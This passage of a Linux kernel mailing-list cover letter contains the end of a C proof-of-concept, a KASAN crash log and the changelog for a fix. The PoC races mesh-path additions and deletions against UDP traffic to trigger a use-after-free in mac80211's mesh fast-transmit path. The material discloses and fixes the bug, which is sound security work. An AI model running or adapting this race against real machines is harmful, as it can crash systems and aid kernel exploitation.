		int err =3D del_mpath_once(sock, family_id, ifindex, g_cfg.dst_mac);=0D
=0D
		if (!err) {=0D
			atomic_fetch_add_explicit(&del_ok, 1, memory_order_relaxed);=0D
			sleep_us(g_cfg.del_pause_us);=0D
			continue;=0D
		}=0D
=0D
		if (err =3D=3D -NLE_OBJ_NOTFOUND || err =3D=3D -NLE_NOADDR ||=0D
		    err =3D=3D -NLE_FAILURE) {=0D
			atomic_fetch_add_explicit(&del_absent, 1,=0D
						  memory_order_relaxed);=0D
			sleep_us(g_cfg.del_pause_us);=0D
			continue;=0D
		}=0D
=0D
		atomic_fetch_add_explicit(&del_err, 1, memory_order_relaxed);=0D
	}=0D
=0D
	nl_socket_free(sock);=0D
	return NULL;=0D
}=0D
=0D
static void *sender_thread(void *arg)=0D
{=0D
	unsigned int thread_index =3D (unsigned long)arg;=0D
	struct sockaddr_in dst =3D {=0D
		.sin_family =3D AF_INET,=0D
		.sin_port =3D htons(9),=0D
	};=0D
	int fd;=0D
	char *payload;=0D
=0D
	pin_to_cpu(thread_index);=0D
=0D
	if (inet_pton(AF_INET, g_cfg.dst_ip, &dst.sin_addr) !=3D 1) {=0D
		fprintf(stderr, "inet_pton(%s) failed\n", g_cfg.dst_ip);=0D
		atomic_fetch_add_explicit(&send_err, 1, memory_order_relaxed);=0D
		return NULL;=0D
	}=0D
=0D
	fd =3D socket(AF_INET, SOCK_DGRAM, 0);=0D
	if (fd < 0) {=0D
		perror("socket");=0D
		atomic_fetch_add_explicit(&send_err, 1, memory_order_relaxed);=0D
		return NULL;=0D
	}=0D
=0D
	if (setsockopt(fd, SOL_SOCKET, SO_BINDTODEVICE, g_cfg.ifname,=0D
		       strlen(g_cfg.ifname) + 1) < 0) {=0D
		perror("SO_BINDTODEVICE");=0D
		close(fd);=0D
		atomic_fetch_add_explicit(&send_err, 1, memory_order_relaxed);=0D
		return NULL;=0D
	}=0D
=0D
	if (connect(fd, (struct sockaddr *)&dst, sizeof(dst)) < 0) {=0D
		perror("connect");=0D
		close(fd);=0D
		atomic_fetch_add_explicit(&send_err, 1, memory_order_relaxed);=0D
		return NULL;=0D
	}=0D
=0D
	payload =3D malloc(g_cfg.payload_len);=0D
	if (!payload) {=0D
		perror("malloc");=0D
		close(fd);=0D
		atomic_fetch_add_explicit(&send_err, 1, memory_order_relaxed);=0D
		return NULL;=0D
	}=0D
=0D
	memset(payload, 'A' + (thread_index % 26), g_cfg.payload_len);=0D
=0D
	while (!atomic_load_explicit(&stop_flag, memory_order_relaxed)) {=0D
		ssize_t ret =3D send(fd, payload, g_cfg.payload_len, MSG_NOSIGNAL);=0D
=0D
		if (ret =3D=3D (ssize_t)g_cfg.payload_len)=0D
			atomic_fetch_add_explicit(&send_ok, 1, memory_order_relaxed);=0D
		else=0D
			atomic_fetch_add_explicit(&send_err, 1, memory_order_relaxed);=0D
	}=0D
=0D
	free(payload);=0D
	close(fd);=0D
	return NULL;=0D
}=0D
=0D
static void *progress_thread(void *arg)=0D
{=0D
	(void)arg;=0D
=0D
	while (!atomic_load_explicit(&stop_flag, memory_order_relaxed)) {=0D
		sleep(1);=0D
		printf("stats send_ok=3D%llu send_err=3D%llu add_ok=3D%llu add_exist=3D%l=
lu "=0D
		       "add_err=3D%llu del_ok=3D%llu del_absent=3D%llu del_err=3D%llu\n",=
=0D
		       (unsigned long long)atomic_load_explicit(&send_ok,=0D
						memory_order_relaxed),=0D
		       (unsigned long long)atomic_load_explicit(&send_err,=0D
						memory_order_relaxed),=0D
		       (unsigned long long)atomic_load_explicit(&add_ok,=0D
						memory_order_relaxed),=0D
		       (unsigned long long)atomic_load_explicit(&add_exist,=0D
						memory_order_relaxed),=0D
		       (unsigned long long)atomic_load_explicit(&add_err,=0D
						memory_order_relaxed),=0D
		       (unsigned long long)atomic_load_explicit(&del_ok,=0D
						memory_order_relaxed),=0D
		       (unsigned long long)atomic_load_explicit(&del_absent,=0D
						memory_order_relaxed),=0D
		       (unsigned long long)atomic_load_explicit(&del_err,=0D
						memory_order_relaxed));=0D
		fflush(stdout);=0D
	}=0D
=0D
	return NULL;=0D
}=0D
=0D
int main(int argc, char **argv)=0D
{=0D
	pthread_t *threads =3D NULL;=0D
	pthread_t progress;=0D
	size_t total_threads;=0D
	size_t idx =3D 0;=0D
	char dst_buf[18];=0D
	char nh_buf[18];=0D
	int opt;=0D
	unsigned int i;=0D
	int ret =3D EXIT_SUCCESS;=0D
=0D
	while ((opt =3D getopt(argc, argv, "i:a:m:n:s:t:A:D:l:u:v:R:h")) !=3D -1) =
{=0D
		switch (opt) {=0D
		case 'i':=0D
			strncpy(g_cfg.ifname, optarg, sizeof(g_cfg.ifname) - 1);=0D
			g_cfg.ifname[sizeof(g_cfg.ifname) - 1] =3D '\0';=0D
			break;=0D
		case 'a':=0D
			strncpy(g_cfg.dst_ip, optarg, sizeof(g_cfg.dst_ip) - 1);=0D
			g_cfg.dst_ip[sizeof(g_cfg.dst_ip) - 1] =3D '\0';=0D
			break;=0D
		case 'm':=0D
			if (parse_mac(optarg, g_cfg.dst_mac) < 0) {=0D
				fprintf(stderr, "invalid dst MAC: %s\n", optarg);=0D
				return EXIT_FAILURE;=0D
			}=0D
			break;=0D
		case 'n':=0D
			if (parse_mac(optarg, g_cfg.next_hop) < 0) {=0D
				fprintf(stderr, "invalid next-hop MAC: %s\n",=0D
					optarg);=0D
				return EXIT_FAILURE;=0D
			}=0D
			break;=0D
		case 's':=0D
			g_cfg.seconds =3D strtoul(optarg, NULL, 0);=0D
			break;=0D
		case 't':=0D
			g_cfg.senders =3D strtoul(optarg, NULL, 0);=0D
			break;=0D
		case 'A':=0D
			g_cfg.adders =3D strtoul(optarg, NULL, 0);=0D
			break;=0D
		case 'D':=0D
			g_cfg.deleters =3D strtoul(optarg, NULL, 0);=0D
			break;=0D
		case 'l':=0D
			g_cfg.payload_len =3D strtoul(optarg, NULL, 0);=0D
			break;=0D
		case 'u':=0D
			g_cfg.add_pause_us =3D strtoul(optarg, NULL, 0);=0D
			break;=0D
		case 'v':=0D
			g_cfg.del_pause_us =3D strtoul(optarg, NULL, 0);=0D
			break;=0D
		case 'R':=0D
			g_cfg.hwsim_radios =3D strtoul(optarg, NULL, 0);=0D
			break;=0D
		default:=0D
			usage(argv[0]);=0D
			return opt =3D=3D 'h' ? EXIT_SUCCESS : EXIT_FAILURE;=0D
		}=0D
	}=0D
=0D
	if (g_cfg.hwsim_radios)=0D
		return create_hwsim_radios(g_cfg.hwsim_radios);=0D
=0D
	if (!g_cfg.senders || !g_cfg.adders || !g_cfg.deleters ||=0D
	    !g_cfg.seconds || !g_cfg.payload_len ||=0D
	    !memcmp(g_cfg.dst_mac, "\0\0\0\0\0\0", ETH_ALEN) ||=0D
	    !memcmp(g_cfg.next_hop, "\0\0\0\0\0\0", ETH_ALEN)) {=0D
		usage(argv[0]);=0D
		return EXIT_FAILURE;=0D
	}=0D
=0D
	signal(SIGINT, stop_now);=0D
	signal(SIGTERM, stop_now);=0D
=0D
	total_threads =3D g_cfg.senders + g_cfg.adders + g_cfg.deleters;=0D
	threads =3D calloc(total_threads, sizeof(*threads));=0D
	if (!threads) {=0D
		perror("calloc");=0D
		return EXIT_FAILURE;=0D
	}=0D
=0D
	printf("ifname=3D%s dst_ip=3D%s dst_mac=3D%s next_hop=3D%s seconds=3D%u "=
=0D
	       "senders=3D%u adders=3D%u deleters=3D%u payload_len=3D%u "=0D
	       "add_pause_us=3D%u del_pause_us=3D%u\n",=0D
	       g_cfg.ifname, g_cfg.dst_ip,=0D
	       mac_to_str(g_cfg.dst_mac, dst_buf, sizeof(dst_buf)),=0D
	       mac_to_str(g_cfg.next_hop, nh_buf, sizeof(nh_buf)),=0D
	       g_cfg.seconds, g_cfg.senders, g_cfg.adders, g_cfg.deleters,=0D
	       g_cfg.payload_len, g_cfg.add_pause_us, g_cfg.del_pause_us);=0D
	fflush(stdout);=0D
=0D
	for (i =3D 0; i < g_cfg.senders; i++)=0D
		pthread_create(&threads[idx++], NULL, sender_thread,=0D
			       (void *)(unsigned long)i);=0D
	for (i =3D 0; i < g_cfg.adders; i++)=0D
		pthread_create(&threads[idx++], NULL, adder_thread,=0D
			       (void *)(unsigned long)i);=0D
	for (i =3D 0; i < g_cfg.deleters; i++)=0D
		pthread_create(&threads[idx++], NULL, deleter_thread,=0D
			       (void *)(unsigned long)i);=0D
=0D
	pthread_create(&progress, NULL, progress_thread, NULL);=0D
	sleep(g_cfg.seconds);=0D
	atomic_store_explicit(&stop_flag, true, memory_order_relaxed);=0D
=0D
	for (idx =3D 0; idx < total_threads; idx++)=0D
		pthread_join(threads[idx], NULL);=0D
	pthread_join(progress, NULL);=0D
=0D
	printf("final send_ok=3D%llu send_err=3D%llu add_ok=3D%llu add_exist=3D%ll=
u "=0D
	       "add_err=3D%llu del_ok=3D%llu del_absent=3D%llu del_err=3D%llu\n",=
=0D
	       (unsigned long long)atomic_load_explicit(&send_ok,=0D
					memory_order_relaxed),=0D
	       (unsigned long long)atomic_load_explicit(&send_err,=0D
					memory_order_relaxed),=0D
	       (unsigned long long)atomic_load_explicit(&add_ok,=0D
					memory_order_relaxed),=0D
	       (unsigned long long)atomic_load_explicit(&add_exist,=0D
					memory_order_relaxed),=0D
	       (unsigned long long)atomic_load_explicit(&add_err,=0D
					memory_order_relaxed),=0D
	       (unsigned long long)atomic_load_explicit(&del_ok,=0D
					memory_order_relaxed),=0D
	       (unsigned long long)atomic_load_explicit(&del_absent,=0D
					memory_order_relaxed),=0D
	       (unsigned long long)atomic_load_explicit(&del_err,=0D
					memory_order_relaxed));=0D
	fflush(stdout);=0D
=0D
	free(threads);=0D
	return ret;=0D
}=0D
------END poc.c--------=0D
=0D
----BEGIN crash log----=0D
[   40.280725] BUG: KASAN: slab-use-after-free in mesh_fast_tx_get (net/mac=
80211/mesh_pathtbl.c:445)=0D
[   40.281918] Read of size 4 at addr ffff88800d29abb8 by task poc/509=0D
[   40.282887] =0D
[   40.283172] CPU: 1 UID: 0 PID: 509 Comm: poc Not tainted 7.2.0-rc4-g88c1=
7de85ddb #1 PREEMPT(lazy) =0D
[   40.283186] Call Trace:=0D
[   40.283195]  <TASK>=0D
[   40.283196]  dump_stack_lvl (lib/dump_stack.c:94 lib/dump_stack.c:120)=0D
[   40.283226]  print_report (mm/kasan/report.c:378 mm/kasan/report.c:482)=
=0D
[   40.283309]  ? __pfx__raw_spin_lock_irqsave (kernel/locking/spinlock.c:3=
63)=0D
[   40.283319]  ? __virt_addr_valid (include/linux/mmzone.h:2119 (discrimin=
ator 1) include/linux/mmzone.h:2271 (discriminator 1) arch/x86/mm/physaddr.=
c:54 (discriminator 1))=0D
[   40.283371]  ? mesh_fast_tx_get (net/mac80211/mesh_pathtbl.c:445)=0D
[   40.283375]  kasan_report (mm/kasan/report.c:595)=0D
[   40.283379]  ? mesh_fast_tx_get (net/mac80211/mesh_pathtbl.c:445)=0D
[   40.283383]  mesh_fast_tx_get (net/mac80211/mesh_pathtbl.c:445)=0D
[   40.283388]  ? __pfx_mesh_fast_tx_get (net/mac80211/mesh_pathtbl.c:400)=
=0D
[   40.283391]  ? filter_irq_stacks (kernel/stacktrace.c:397)=0D
[   40.283433]  ? stack_depot_save_flags (lib/stackdepot.c:667)=0D
[   40.283495]  ieee80211_mesh_xmit_fast (net/mac80211/mesh.c:779)=0D
[   40.283499]  ? kasan_save_stack (mm/kasan/common.c:58)=0D
[   40.283503]  ? kasan_save_stack (mm/kasan/common.c:57)=0D
[   40.283506]  ? kasan_save_track (mm/kasan/common.c:78)=0D
[   40.283509]  ? __kasan_slab_alloc (mm/kasan/common.c:340 mm/kasan/common=
.c:366)=0D
[   40.283512]  ? __alloc_frozen_pages_noprof (mm/page_alloc.c:4746 (discri=
minator 1) mm/page_alloc.c:5317 (discriminator 1))=0D
[   40.283529]  ? __pfx_ieee80211_mesh_xmit_fast (net/mac80211/mesh.c:699)=
=0D
[   40.283533]  ? sock_alloc_send_pskb (net/core/sock.c:3013)=0D
[   40.283602]  ? ip_make_skb (net/ipv4/ip_output.c:1572)=0D
[   40.283635]  ? udp_sendmsg (net/ipv4/udp.c:1438)=0D
[   40.283672]  ? __sys_sendto (net/socket.c:775 (discriminator 1) net/sock=
et.c:790 (discriminator 1) net/socket.c:2252 (discriminator 1))=0D
[   40.283682]  ? __x64_sys_sendto (net/socket.c:2259 net/socket.c:2255 net=
/socket.c:2255)=0D
[   40.283686]  ? do_syscall_64 (arch/x86/entry/syscall_64.c:63 arch/x86/en=
try/syscall_64.c:94)=0D
[   40.283703]  ? entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S=
:121)=0D
[   40.283719]  __ieee80211_subif_start_xmit (net/mac80211/tx.c:4364)=0D
[   40.283752]  ? __pfx___ieee80211_subif_start_xmit (net/mac80211/tx.c:344=
2)=0D
[   40.283756]  ? skb_network_protocol (include/linux/skbuff.h:2534 include=
/linux/skbuff.h:2867 include/linux/skbuff.h:2882 include/linux/if_vlan.h:67=
2 net/core/dev.c:3679)=0D
[   40.283783]  ieee80211_subif_start_xmit (net/mac80211/tx.c:4607 (discrim=
inator 1))=0D
[   40.283787]  ? __pfx_ieee80211_subif_start_xmit (net/mac80211/tx.c:4421)=
=0D
[   40.283790]  ? kasan_save_track (mm/kasan/common.c:78)=0D
[   40.283794]  ? __kasan_slab_alloc (mm/kasan/common.c:340 mm/kasan/common=
.c:366)=0D
[   40.283798]  dev_hard_start_xmit (include/linux/netdevice.h:5400 include=
/linux/netdevice.h:5409 net/core/dev.c:3889 net/core/dev.c:3905)=0D
[   40.283802]  __dev_queue_xmit (net/core/dev.c:4878)=0D
[   40.283806]  ? csum_partial (lib/checksum.c:119)=0D
[   40.283809]  ? __pfx___dev_queue_xmit (include/linux/netdevice.h:4038 (d=
iscriminator 1))=0D
[   40.283813]  ? __pfx_csum_and_copy_from_iter_full (net/core/skbuff.c:623=
6 (discriminator 1))=0D
[   40.283817]  ? sock_alloc_send_pskb (net/core/sock.c:3016)=0D
[   40.283822]  ? ip_generic_getfrag (net/ipv4/ip_output.c:943)=0D
[   40.283826]  ? __pfx_ip_generic_getfrag (net/ipv4/ip_output.c:658)=0D
[   40.283830]  ip_finish_output2 (include/linux/netdevice.h:3446 include/n=
et/neighbour.h:544 include/net/neighbour.h:558 net/ipv4/ip_output.c:236)=0D
[   40.283834]  ? __ip_append_data (include/linux/skbuff.h:2333 (discrimina=
tor 2) include/linux/skbuff.h:2438 (discriminator 2) include/linux/skbuff.h=
:2471 (discriminator 2) net/ipv4/ip_output.c:1202 (discriminator 2))=0D
[   40.283837]  ? __pfx_ip_finish_output2 (net/ipv4/ip_output.c:614)=0D
[   40.283841]  ? __pfx_ip_generic_getfrag (net/ipv4/ip_output.c:658)=0D
[   40.283845]  __ip_finish_output.part.0 (net/ipv4/ip_output.c:314)=0D
[   40.283849]  ? __pfx___ip_finish_output.part.0 (net/ipv4/ip_output.c:595=
)=0D
[   40.283853]  ? do_csum (lib/checksum.c:64)=0D
[   40.283857]  ip_output (net/ipv4/ip_output.c:443 net/ipv4/ip_output.c:32=
4 include/linux/netfilter.h:307 net/ipv4/ip_output.c:437)=0D
[   40.283860]  ? __pfx_ip_output (net/ipv4/ip_output.c:278)=0D
[   40.283864]  ? ip_make_skb (net/ipv4/ip_output.c:1580)=0D
[   40.283868]  ? __pfx_ip_generic_getfrag (net/ipv4/ip_output.c:658)=0D
[   40.283872]  ? __pfx_ip_make_skb (net/ipv4/ip_output.c:1546)=0D
[   40.283876]  ip_send_skb (include/net/dst.h:470 (discriminator 6) net/ip=
v4/ip_output.c:131 (discriminator 6) net/ipv4/ip_output.c:1506 (discriminat=
or 6))=0D
[   40.283880]  udp_send_skb (net/ipv4/udp.c:1161 (discriminator 1))=0D
[   40.283884]  udp_sendmsg (net/ipv4/udp.c:1443)=0D
[   40.283887]  ? __pfx_udp_sendmsg (net/ipv4/udp.c:1221)=0D
[   40.283891]  ? __pfx___css_rstat_updated (include/linux/srcutree.h:319 (=
discriminator 58))=0D
[   40.283918]  ? vruntime_eligible (kernel/sched/fair.c:616 (discriminator=
 1) kernel/sched/fair.c:903 (discriminator 1))=0D
[   40.283960]  ? pick_eevdf (kernel/sched/fair.c:941 kernel/sched/fair.c:1=
167)=0D
[   40.283964]  ? timerqueue_linked_add (include/linux/rbtree.h:282 lib/tim=
erqueue.c:96)=0D
[   40.283968]  ? _raw_spin_unlock_irqrestore (include/linux/spinlock_api_s=
mp.h:179 (discriminator 1) kernel/locking/spinlock.c:198 (discriminator 1))=
=0D
[   40.283971]  ? inet_send_prepare (net/ipv4/af_inet.c:849 (discriminator =
1))=0D
[   40.283982]  __sys_sendto (net/socket.c:775 (discriminator 1) net/socket=
.c:790 (discriminator 1) net/socket.c:2252 (discriminator 1))=0D
[   40.284006]  ? __pfx___sys_sendto (net/socket.c:2206)=0D
[   40.284012]  ? __pfx___schedule (kernel/sched/core.c:8146)=0D
[   40.284022]  __x64_sys_sendto (net/socket.c:2259 net/socket.c:2255 net/s=
ocket.c:2255)=0D
[   40.284026]  do_syscall_64 (arch/x86/entry/syscall_64.c:63 arch/x86/entr=
y/syscall_64.c:94)=0D
[   40.284031]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:1=
21)=0D
[   40.284034] RIP: 0033:0x7fd985c43494=0D
[   40.284037] Code: 89 4c 24 1c e8 8d f8 ff ff 44 8b 54 24 1c 8b 3c 24 45 =
31 c9 89 c5 48 8b 54 24 10 48 8b 74 24 08 45 31 c0 b8 2c 00 00 00 0f 05 <48=
> 3d 00 f0 ff ff 77 34 89 ef 48 89 04 24 e8 b9 f8 ff ff 48 8b 04=0D
All code=0D
=3D=3D=3D=3D=3D=3D=3D=3D=0D
   0:	89 4c 24 1c          	mov    %ecx,0x1c(%rsp)=0D
   4:	e8 8d f8 ff ff       	call   0xfffffffffffff896=0D
   9:	44 8b 54 24 1c       	mov    0x1c(%rsp),%r10d=0D
   e:	8b 3c 24             	mov    (%rsp),%edi=0D
  11:	45 31 c9             	xor    %r9d,%r9d=0D
  14:	89 c5                	mov    %eax,%ebp=0D
  16:	48 8b 54 24 10       	mov    0x10(%rsp),%rdx=0D
  1b:	48 8b 74 24 08       	mov    0x8(%rsp),%rsi=0D
  20:	45 31 c0             	xor    %r8d,%r8d=0D
  23:	b8 2c 00 00 00       	mov    $0x2c,%eax=0D
  28:	0f 05                	syscall=0D
  2a:*	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax		<-- trapping =
instruction=0D
  30:	77 34                	ja     0x66=0D
  32:	89 ef                	mov    %ebp,%edi=0D
  34:	48 89 04 24          	mov    %rax,(%rsp)=0D
  38:	e8 b9 f8 ff ff       	call   0xfffffffffffff8f6=0D
  3d:	48                   	rex.W=0D
  3e:	8b                   	.byte 0x8b=0D
  3f:	04                   	.byte 0x4=0D
=0D
Code starting with the faulting instruction=0D
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=0D
   0:	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax=0D
   6:	77 34                	ja     0x3c=0D
   8:	89 ef                	mov    %ebp,%edi=0D
   a:	48 89 04 24          	mov    %rax,(%rsp)=0D
   e:	e8 b9 f8 ff ff       	call   0xfffffffffffff8cc=0D
  13:	48                   	rex.W=0D
  14:	8b                   	.byte 0x8b=0D
  15:	04                   	.byte 0x4=0D
[   40.284041] RSP: 002b:00007fd97fffee90 EFLAGS: 00000246 ORIG_RAX: 000000=
000000002c=0D
[   40.284058] RAX: ffffffffffffffda RBX: 0000000000000003 RCX: 00007fd985c=
43494=0D
[   40.284060] RDX: 0000000000000100 RSI: 00007fd96c000b60 RDI: 00000000000=
00006=0D
[   40.284063] RBP: 0000000000000000 R08: 0000000000000000 R09: 00000000000=
00000=0D
[   40.284065] R10: 0000000000004000 R11: 0000000000000246 R12: 00007fd96c0=
00b60=0D
[   40.284067] R13: 0000000000000100 R14: 00007fd97fffefc0 R15: 00000000008=
02000=0D
[   40.284071]  </TASK>=0D
[   40.284072] =0D
[   40.347188] Allocated by task 510:=0D
[   40.347727]  kasan_save_stack (mm/kasan/common.c:57)=0D
[   40.348370]  kasan_save_track (mm/kasan/common.c:78)=0D
[   40.348978]  __kasan_kmalloc (mm/kasan/common.c:398 mm/kasan/common.c:41=
5)=0D
[   40.349576]  __kmalloc_cache_noprof (include/linux/kasan.h:263 mm/slub.c=
:5515)=0D
[   40.350289]  mesh_path_new.constprop.0 (include/linux/slab.h:969 include=
/linux/slab.h:1290 net/mac80211/mesh_pathtbl.c:408)=0D
[   40.351023]  mesh_path_add (net/mac80211/mesh_pathtbl.c:696)=0D
[   40.351645]  ieee80211_add_mpath (net/mac80211/cfg.c:2911)=0D
[   40.352358]  nl80211_new_mpath (net/wireless/rdev-ops.h:255 net/wireless=
/nl80211.c:9795)=0D
[   40.353001]  genl_family_rcv_msg_doit (net/netlink/genetlink.c:1114)=0D
[   40.353736]  genl_rcv_msg (net/netlink/genetlink.c:1194 net/netlink/gene=
tlink.c:1209)=0D
[   40.354416]  netlink_rcv_skb (net/netlink/af_netlink.c:2556)=0D
[   40.354986]  genl_rcv (net/netlink/genetlink.c:1218)=0D
[   40.355476]  netlink_unicast (net/netlink/af_netlink.c:1319 net/netlink/=
af_netlink.c:1345)=0D
[   40.356094]  netlink_sendmsg (net/netlink/af_netlink.c:1900)=0D
[   40.356869]  ____sys_sendmsg (net/socket.c:775 (discriminator 1) net/soc=
ket.c:790 (discriminator 1) net/socket.c:2684 (discriminator 1))=0D
[   40.357511]  ___sys_sendmsg (net/socket.c:2738)=0D
[   40.358186]  __sys_sendmsg (net/socket.c:2770)=0D
[   40.358732]  do_syscall_64 (arch/x86/entry/syscall_64.c:63 arch/x86/entr=
y/syscall_64.c:94)=0D
[   40.359277]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:1=
21)=0D
[   40.360040] =0D
[   40.360296] Freed by task 12:=0D
[   40.360758]  kasan_save_stack (mm/kasan/common.c:57)=0D
[   40.361371]  kasan_save_track (mm/kasan/common.c:78)=0D
[   40.362044]  kasan_save_free_info (mm/kasan/generic.c:584)=0D
[   40.362824]  __kasan_slab_free (mm/kasan/common.c:253 mm/kasan/common.c:=
285)=0D
[   40.363403]  kmem_cache_free_bulk (include/linux/kasan.h:235 mm/slub.c:2=
705 mm/slub.c:2734 mm/slub.c:6439 mm/slub.c:7176 mm/slub.c:7155)=0D
[   40.364070]  kvfree_rcu_bulk (include/linux/slab.h:891 mm/slab_common.c:=
1502)=0D
[   40.364732]  kfree_rcu_work (mm/slab_common.c:1580)=0D
[   40.365305]  process_one_work (kernel/workqueue.c:3322)=0D
[   40.365913]  worker_thread (kernel/workqueue.c:3405 kernel/workqueue.c:3=
486)=0D
[   40.366689]  kthread (kernel/kthread.c:436)=0D
[   40.367200]  ret_from_fork (arch/x86/kernel/process.c:158)=0D
[   40.367784]  ret_from_fork_asm (arch/x86/entry/entry_64.S:245)=0D
[   40.368395] =0D
[   40.368700] Last potentially related work creation:=0D
[   40.369461]  kasan_save_stack (mm/kasan/common.c:57)=0D
[   40.370028]  kasan_record_aux_stack (mm/kasan/generic.c:556)=0D
[   40.370782]  kvfree_call_rcu (mm/slab_common.c:1970)=0D
[   40.371567]  mesh_path_del (net/mac80211/mesh_pathtbl.c:910 net/mac80211=
/mesh_pathtbl.c:931)=0D
[   40.372226]  nl80211_del_mpath (net/wireless/rdev-ops.h:265 net/wireless=
/nl80211.c:9813)=0D
[   40.372835]  genl_family_rcv_msg_doit (net/netlink/genetlink.c:1114)=0D
[   40.373540]  genl_rcv_msg (net/netlink/genetlink.c:1194 net/netlink/gene=
tlink.c:1209)=0D
[   40.374109]  netlink_rcv_skb (net/netlink/af_netlink.c:2556)=0D
[   40.374744]  genl_rcv (net/netlink/genetlink.c:1218)=0D
[   40.375233]  netlink_unicast (net/netlink/af_netlink.c:1319 net/netlink/=
af_netlink.c:1345)=0D
[   40.375808]  netlink_sendmsg (net/netlink/af_netlink.c:1900)=0D
[   40.376467]  ____sys_sendmsg (net/socket.c:775 (discriminator 1) net/soc=
ket.c:790 (discriminator 1) net/socket.c:2684 (discriminator 1))=0D
[   40.377108]  ___sys_sendmsg (net/socket.c:2738)=0D
[   40.377674]  __sys_sendmsg (net/socket.c:2770)=0D
[   40.378214]  do_syscall_64 (arch/x86/entry/syscall_64.c:63 arch/x86/entr=
y/syscall_64.c:94)=0D
[   40.378869]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:1=
21)=0D
[   40.379593] =0D
[   40.379858] The buggy address belongs to the object at ffff88800d29ab00=
=0D
[   40.379858]  which belongs to the cache kmalloc-256 of size 256=0D
[   40.381678] The buggy address is located 184 bytes inside of=0D
[   40.381678]  freed 256-byte region [ffff88800d29ab00, ffff88800d29ac00)=
=0D
[   40.383451] =0D
[   40.383716] The buggy address belongs to the physical page:=0D
[   40.384575] page: refcount:0 mapcount:0 mapping:0000000000000000 index:0=
xffff88800d29b400 pfn:0xd298=0D
[   40.385910] head: order:2 mapcount:0 entire_mapcount:0 nr_pages_mapped:0=
 pincount:0=0D
[   40.387028] flags: 0x100000000000240(workingset|head|node=3D0|zone=3D1)=
=0D
[   40.388059] page_type: f5(slab)=0D
[   40.388541] raw: 0100000000000240 ffff888001042dc0 ffffea000010bf10 ffff=
ea00000f2c10=0D
[   40.389682] raw: ffff88800d29b400 000000000015000e 00000000f5000000 0000=
000000000000=0D
[   40.390789] head: 0100000000000240 ffff888001042dc0 ffffea000010bf10 fff=
fea00000f2c10=0D
[   40.391949] head: ffff88800d29b400 000000000015000e 00000000f5000000 000=
0000000000000=0D
[   40.393153] head: 0100000000000002 ffffffffffffff01 00000000ffffffff 000=
00000ffffffff=0D
[   40.394259] head: 0000000000000000 0000000000000000 00000000ffffffff 000=
0000000000000=0D
[   40.395434] page dumped because: kasan: bad access detected=0D
[   40.396325] =0D
[   40.396585] Memory state around the buggy address:=0D
[   40.397340]  ffff88800d29aa80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc=
 fc fc=0D
[   40.398376]  ffff88800d29ab00: fa fb fb fb fb fb fb fb fb fb fb fb fb fb=
 fb fb=0D
[   40.399510] >ffff88800d29ab80: fb fb fb fb fb fb fb fb fb fb fb fb fb fb=
 fb fb=0D
[   40.400580]                                         ^=0D
[   40.401333]  ffff88800d29ac00: fc fc fc fc fc fc fc fc fc fc fc fc fc fc=
 fc fc=0D
[   40.402380]  ffff88800d29ac80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc=
 fc fc=0D
[   40.403428] =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=0D
[   40.404576] Kernel panic - not syncing: KASAN: panic_on_warn set ...=0D
-----END crash log-----=0D
=0D
Best regards,=0D
Zihan Xi=0D
=0D
=0D
changes in v3:=0D
  - Use WRITE_ONCE() for both deletion-side MESH_PATH_DELETED updates=0D
    to match the lockless READ_ONCE() checks.=0D
  - v2 Link: https://lore.kernel.org/all/cover.1788930567.git.zihanx@nebuse=
c.ai/=0D
changes in v2:=0D
  - Rewrite the commit message.=0D
  - v1 Link: https://lore.kernel.org/all/94174303640c5e1022b31836770bad75f7=
41afbf.1788845030.git.zihanx@nebusec.ai/=0D
=0D
Zihan Xi (1):=0D
  wifi: mac80211: fix mesh fast xmit path deletion UAF=0D
=0D
 net/mac80211/mesh_pathtbl.c | 12 +++++++++++-=0D
 1 file changed, 11 insertions(+), 1 deletion(-)=0D
=0D
-- =0D
2.43.0=0D
=0D
